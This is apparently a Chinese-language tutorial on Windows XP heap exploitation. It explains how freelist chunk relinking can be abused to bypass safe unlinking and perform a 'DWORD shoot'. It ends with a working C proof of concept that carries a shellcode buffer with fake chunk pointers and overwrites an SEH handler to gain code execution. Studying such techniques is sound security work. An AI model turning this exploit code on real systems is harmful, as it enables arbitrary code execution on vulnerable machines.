


###  觀察堆

### 溫馨提示:占用態的堆 flink blink 也會變成 data 的一部分

```
#include <windows.h>

void main()
{
	HLOCAL h1;
	HANDLE hp;
	hp = HeapCreate(0, 0x1000, 0x10000);
	__asm int 3
	h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 0x10);
}
```




###  关键的地方在 ntdll.dll 基址偏移 (xp sp2 0x11513)  (sp3 是 0x10FE3) ，是修改新的 chunk 和上一个 chunk 指针的开始，反汇编代码如下：



```
1 7C931513  8D47 08        LEA EAX,DWORD PTR DS:[EDI+8]   ; 获取 new_chunk 的 Flink 的位置
2 7C931516  8985 10FFFFFF  MOV DWORD PTR SS:[EBP-F0],EAX
3 7C93151C  8B51 04        MOV EDX,DWORD PTR DS:[ECX+4]   ; 获取 next_chunk 的 Blink 的位置；ECX==old_chunk->Flink==next_chunk
4 7C93151F  8995 08FFFFFF  MOV DWORD PTR SS:[EBP-F8],EDX
5 7C931525  8908           MOV DWORD PTR DS:[EAX],ECX     ; 保存 new_chunk 的 Flink
6 7C931527  8950 04        MOV DWORD PTR DS:[EAX+4],EDX   ; 保存 new_chunk 的 Blink
7 7C93152A  8902           MOV DWORD PTR DS:[EDX],EAX     ; 更新 next_chunk 的 Blink->Flink 的 Flink
8 7C93152C  8941 04        MOV DWORD PTR DS:[ECX+4],EAX   ; 更新 next_chunk 的 Blink

```

### 算法伪代码如下：

```
1 // 设置 new_chunk
2 new_chunk->Flink = old_chunk->Flink
3 new_chunk->Blink = old_chunk->Flink->Blink  // 算法开始时 ECX 已保存 old_chunk->Flink==next_chunk，各步计算以 ECX 为线索
4 // 将 new_chunk 插入到 FreeList[]
5 old_chunk->Flink->Blink->Flink = new_chunk
6 old_chunk->Flink->Blink = new_chunk

```



###  簡單圖說明

原始的free[ 0 ] 鍊
a b c 塊 和一個塊尾 d
下一部即將分配空間，說明著塊尾，即將被拿去一部分，並且產生新的chunk

![enter image description here](https://i.imgur.com/v0ruu3t.jpg)



步驟1，先把 d 塊給摘掉  。 摘掉過程

但是d已經脫離了鍊，它回不去隊伍了，它要怎麼讓其他人工作正常，它發現自己手上有一份舊的名單

我的Flink是 a 我要丟到我的[Blink]裡面
我的Blink是 c 我要丟到我的[Flink+4] 裡面
// 這就是之前的 dword shooting的原理 但是已經不管用了，但在 safe unlink下已經沒用了。

![enter image description here](https://i.imgur.com/hUwK4wk.jpg)





步驟2， d 被摘下後，這時新的大塊尾 e 現在是沒用的，它必須變成一個新的chunk，鍊入 free[0]。 這也需要  d 這個 old chunk 來完成
![enter image description here](https://i.imgur.com/vo1hMeB.jpg)



步驟3，d 告訴 e 說，你要接手我的名單，你的Flink 以後接手我的Flink
```
new_chunk->Flink = old_chunk->Flink
```
 ![enter image description here](https://i.imgur.com/EBjJPlC.jpg)


步驟4，d 告訴 e 說，你的Blink是...等等我，我找一下 ，d先找到了自己的 Flink 找到了 a 塊 ，再從 a 塊上的 blink 找到 c 。所以把c 交給 e 的 blink 。

```
new_chunk->Blink = old_chunk->Flink->Blink  // 算法开始时 ECX 已保存 
```
![enter image description here](https://i.imgur.com/6pxD1Ex.jpg)

 

步驟5 ， d 心裡想說:  e 的工作都安排好以後，還必須介紹e 這個新人讓大家知道一下。

d 打電話給 a : 說 e這個新人要來接手我的工作 。

所以 a 也很高興打電話給c 說，以後你的 flink 就給e好了。

```
old_chunk->Flink->Blink->Flink = new_chunk
```
![enter image description here](https://i.imgur.com/0Sa7TEn.jpg)




步驟6 ，a 打完電話後，心理想我要確認e 這個人 工作狀況如何，所以把 e 放進自己的 blink。

```
old_chunk->Flink->Blink = new_chunk
```

![enter image description here](https://i.imgur.com/eM03Lsu.jpg)



這時 e 已經完全被鍊入了，開始工作了 d 已經沒用了。 




如果事先将 old_chunk->Flink 覆盖为 0xAAAAAAAA，就会执行：

```
1 [new_chunk->Flink] = 0xAAAAAAAA
2 [new_chunk->Blink] = [0xAAAAAAAA+4]              // read *(0xAAAAAAAA+4)
3 [[0xAAAAAAAA+4]] = new_chunk   // DWORD SHOOT    // write &(*(0xAAAAAAAA+4))
4 [0xAAAAAAAA+4] = new_chunk                       // write &(0xAAAAAAAA+4))

```



網路上有蠻多關於這章節的教學文章，所以我這邊只舉出我覺得關鍵的地方。(抱歉這個地方很難做，偷懶了)

總之精采的地方是我們先把舊chunk的 flink 和 blink都指向 003A06EB 
並且真的在 003A06EB 放了假的 (flink) 003a068c 和 (blink) 0012ffe4 造成了 dword shoot

###  選擇 003A06EB 這個位置是因為 EB 是跳躍指令。



```
#include <string.h>
#include <stdio.h>
#include <windows.h>

void main()
{
	char shellcode[] = 
	"AAAAAAAAAAAAAAAA" //16  h1_data


    "\x10\x01\x10\x00\x99\x99\x99\x99" // 舊chunk_head
    "\xeb\x06\x3a\x00\xeb\x06\x3a\x00" //偽造的 old chunk 003A06EB

    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90"
	//63 padding 

	"\xeb\x08"// 書上的小跳是擺在上面 但我發現舊的chunk被處理後前面有些nop 會被改掉所以我放後面
	//在+2= 65 padding 到 003a06eb之前

	


    
    "\x8c\x06\x3a\x00" //003a06eb [003a068c]
  
    "\xe4\xff\x12\x00" //003a06eb8 +4 [0012ffe4]

	"\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c"
	"\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53"
	"\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b"
	"\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95"
	"\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59"
	"\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a"
	"\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75"
	"\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03"
	"\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb"
	"\x53\x68\x2d\x6a\x6f\x62\x68\x67\x6f\x6f\x64\x8b\xc4\x53\x50\x50"
	"\x53\xff\x57\xfc\x53\xff\x57\xf8"

	;





	int zero = 0;

	HLOCAL h1, h2;
	HANDLE hp;
	hp = HeapCreate(0, 0x1000, 0x10000);
	__asm int 3
	h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 0x10);
	memcpy(h1, shellcode, 300);
	__asm int 3
	h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 0x10);




	zero = 1 / zero;
	printf("%d", zero);
}
```



簡單示意圖:


正常狀態 


![enter image description here](https://i.imgur.com/9IlGEf5.png)


正常狀態

![enter image description here](https://i.imgur.com/OVEhCMQ.png)




偽造示意圖:
###  a 和 b 互指
![enter image description here](https://i.imgur.com/qBUsE5l.jpg)


###   b 被拆掉 ， a 指自己

![enter image description here](https://i.imgur.com/lNRdcP0.jpg)



###  新的 chunk c 要產生了

![enter image description here](https://i.imgur.com/yDMQdJ4.jpg)


###  B 這個old chunk 被惡意填充假數據，導致C 也跟變了。
####  而我們又真的在 003a06eb 這個位置造假
### 1.new_chunk->Flink = old_chunk->Flink
### 2.new_chunk->Blink = old_chunk->Flink->Blink
![enter image description here](https://i.imgur.com/zCaZqbM.jpg)



### 3.old_chunk->Flink->Blink->Flink = new_chunk  (dword shoot)
### 4.old_chunk->Flink->Blink = new_chunk


![enter image description here](https://i.imgur.com/Vh4Mjo0.jpg)



###  0012ffe4 這個 seh handler 被dword shoot 

![enter image description here](https://i.imgur.com/FZJhuCJ.png)


###  成功

![enter image description here](https://i.imgur.com/DR6TrGW.png)
